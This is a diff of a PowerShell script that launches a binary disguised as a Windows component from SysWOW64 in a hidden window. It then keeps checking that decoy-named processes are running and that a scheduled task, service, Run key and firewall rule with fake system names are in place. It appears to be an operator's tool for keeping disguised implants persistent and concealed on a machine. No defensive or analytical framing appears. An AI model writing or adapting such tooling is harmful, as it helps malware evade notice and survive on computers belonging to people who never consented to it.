@@ -1,14 +1,14 @@
 # ====================================================================
-# PowerShell: Binary Launcher + Process + Task + RunKey Monitor
+# PowerShell: Binary Launcher + Full Persistence Monitor
+# Checks Process, Service, Task, RunKey, and Firewall Rule
 # ====================================================================
 
-# --- 1. Define binaries to run as admin ---
+# --- 1. Define binaries to run ---
 $binaries = @(
-    @{ Path = "C:\Windows\SystemApps\WindowsUpdater.exe"; WorkingDirectory = "C:\Windows\SystemApps\" }
+    @{ Path = "C:\Windows\SysWOW64\WinRegistry.exe"; WorkingDirectory = "C:\Windows\SysWOW64\" }
 )
 
-Write-Host "Launching target binaries as Administrator..." -ForegroundColor Cyan
-
+Write-Host "Launching target binaries..." -ForegroundColor Cyan
 foreach ($binary in $binaries) {
     $filePath   = $binary.Path
     $workingDir = $binary.WorkingDirectory
@@ -16,8 +16,8 @@ foreach ($binary in $binaries) {
     if (Test-Path -Path $filePath) {
         try {
             Start-Sleep -Seconds 2
-            Start-Process -FilePath $filePath -Verb RunAs -WorkingDirectory $workingDir
-            Write-Host "Executed $filePath as Administrator" -ForegroundColor Green
+            Start-Process -FilePath $filePath -WorkingDirectory $workingDir -WindowStyle Hidden
+            Write-Host "Executed $filePath" -ForegroundColor Green
         }
         catch {
             Write-Warning "Failed to execute $filePath - $($_.Exception.Message)"
@@ -28,14 +28,14 @@ foreach ($binary in $binaries) {
     }
 }
 
-# --- 2. Define processes to monitor ---
-$exesToCheck = @(
-    "WinLogin.exe",
-    "WindowsUpdater.exe",
-    "Windows License Monitor.exe"
-)
+# --- 2. Define items to check ---
+$exesToCheck = @("Windows Session Monitor.exe", "WinRegistry.exe", "Windows Logging Services.exe")
+$taskName    = "Registry Optimization"
+$serviceName = "Windows Registry Initializer"
+$firewallRule = "Windows License Monitor"
+$runKeyName  = "Windows Registry Initializer"
 
-# --- 3. Helper Function: Check if process is running ---
+# --- 3. Helper: Check if process is running ---
 function Get-ProcessCount {
     param([string]$ProcessName)
     $procName = ($ProcessName -replace '.exe$', '')
@@ -43,19 +43,18 @@ function Get-ProcessCount {
     return $procs.Count
 }
 
-# --- 4. Helper Function: Check if scheduled task exists ---
-function Test-ScheduledTask {
+# --- 4. Helper: Check if Scheduled Task exists & enabled ---
+function Get-ScheduledTaskStatus {
     param([string]$TaskName)
     try {
         $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction Stop
-        return $true
+        if ($task.State -eq "Disabled") { return "Disabled" }
+        return "Enabled"
     }
-    catch {
-        return $false
-    }
+    catch { return "Missing" }
 }
 
-# --- 5. Helper Function: Check if Run key exists ---
+# --- 5. Helper: Check if Run key exists ---
 function Test-RunKey {
     param([string]$KeyName)
     $path = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -63,47 +62,86 @@ function Test-RunKey {
         $value = Get-ItemProperty -Path $path -Name $KeyName -ErrorAction Stop
         return $true
     }
+    catch { return $false }
+}
+
+# --- 6. Helper: Check if Service exists & startup mode ---
+function Get-ServiceStatus {
+    param([string]$ServiceName)
+    try {
+        $svc = Get-Service -Name $ServiceName -ErrorAction Stop
+        $startup = (Get-WmiObject -Class Win32_Service -Filter "Name='$ServiceName'").StartMode
+        return @{ Exists = $true; Status = $svc.Status; StartMode = $startup }
+    }
     catch {
-        return $false
+        return @{ Exists = $false; Status = "Missing"; StartMode = "N/A" }
     }
 }
 
-# --- 6. Continuous monitoring loop ---
+# --- 7. Helper: Check if Firewall rule exists & enabled ---
+function Get-FirewallRuleStatus {
+    param([string]$RuleName)
+    try {
+        $rules = netsh advfirewall firewall show rule name="$RuleName" | Out-String
+        if ($rules -match "No rules match") { return "Missing" }
+        if ($rules -match "Enabled:\s*Yes") { return "Enabled" }
+        else { return "Disabled" }
+    }
+    catch { return "Missing" }
+}
+
+# --- 8. Continuous monitoring loop ---
 while ($true) {
     Clear-Host
     Write-Host "=== STATUS CHECK at $(Get-Date -Format 'HH:mm:ss') ===" -ForegroundColor Cyan
     Write-Host ""
 
-    # --- Check all processes ---
+    # --- Processes ---
     foreach ($exe in $exesToCheck) {
         $count = Get-ProcessCount -ProcessName $exe
         if ($count -gt 0) {
             Write-Host ("{0,-35} {1}" -f $exe, "Running ($count instance[s])") -ForegroundColor Green
-        }
-        else {
+        } else {
             Write-Host ("{0,-35} {1}" -f $exe, "Not Running") -ForegroundColor Red
         }
     }
 
     Write-Host ""
-    Write-Host "=== Checking Scheduled Task & Run Key ===" -ForegroundColor Yellow
+    Write-Host "=== Persistence Mechanisms ===" -ForegroundColor Yellow
 
-    # --- Check Scheduled Task ---
-    $taskExists = Test-ScheduledTask -TaskName "Wireless Network Optimization"
-    if ($taskExists) {
-        Write-Host "Scheduled Task 'Wireless Network Optimization': Present" -ForegroundColor Green
-    }
-    else {
-        Write-Host "Scheduled Task 'Wireless Network Optimization': Missing" -ForegroundColor Red
+    # --- Scheduled Task ---
+    $taskStatus = Get-ScheduledTaskStatus -TaskName $taskName
+    if ($taskStatus -eq "Enabled") {
+        Write-Host "Scheduled Task '$taskName': Enabled" -ForegroundColor Green
+    } elseif ($taskStatus -eq "Disabled") {
+        Write-Host "Scheduled Task '$taskName': Disabled" -ForegroundColor Yellow
+    } else {
+        Write-Host "Scheduled Task '$taskName': Missing" -ForegroundColor Red
     }
 
-    # --- Check Run key ---
-    $runKeyExists = Test-RunKey -KeyName "Windows Service Initializer"
+    # --- Service ---
+    $svc = Get-ServiceStatus -ServiceName $serviceName
+    if ($svc.Exists) {
+        $color = if ($svc.StartMode -eq "Auto") { "Green" } else { "Yellow" }
+        Write-Host "Service '$serviceName': Exists, StartMode=$($svc.StartMode), Status=$($svc.Status)" -ForegroundColor $color
+    } else {
+        Write-Host "Service '$serviceName': Missing" -ForegroundColor Red
+    }
+
+    # --- Run Key ---
+    $runKeyExists = Test-RunKey -KeyName $runKeyName
     if ($runKeyExists) {
-        Write-Host "Run Key 'Windows Service Initializer': Present" -ForegroundColor Green
+        Write-Host "Run Key '$runKeyName': Present" -ForegroundColor Green
+    } else {
+        Write-Host "Run Key '$runKeyName': Missing" -ForegroundColor Red
     }
-    else {
-        Write-Host "Run Key 'Windows Service Initializer': Missing" -ForegroundColor Red
+
+    # --- Firewall Rule ---
+    $fwStatus = Get-FirewallRuleStatus -RuleName $firewallRule
+    switch ($fwStatus) {
+        "Enabled"  { Write-Host "Firewall Rule '$firewallRule': Enabled" -ForegroundColor Green }
+        "Disabled" { Write-Host "Firewall Rule '$firewallRule': Disabled" -ForegroundColor Yellow }
+        "Missing"  { Write-Host "Firewall Rule '$firewallRule': Missing" -ForegroundColor Red }
     }
 
     Write-Host ""
